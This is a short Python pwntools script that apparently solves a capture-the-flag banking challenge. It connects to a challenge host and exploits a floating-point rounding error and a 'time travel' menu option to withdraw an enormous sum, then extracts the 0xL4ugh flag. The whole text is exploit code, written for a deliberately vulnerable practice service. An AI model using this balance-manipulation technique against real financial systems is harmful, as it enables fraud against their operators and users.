from pwn import *

io = remote("spare-change.webctf.online", 1337)

# floating point error
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'amount', b'4.99')
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'amount', b'4.93')

# time travel
io.sendlineafter(b'>', b'3')

# get flag
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'amount', b'60000000000000')

io.sendlineafter(b'>', b'4')

resp = io.recvall().decode().strip()
io.close()

flag = re.findall(r'(0xL4ugh{.+})', resp)[0]
print("Flag:", flag)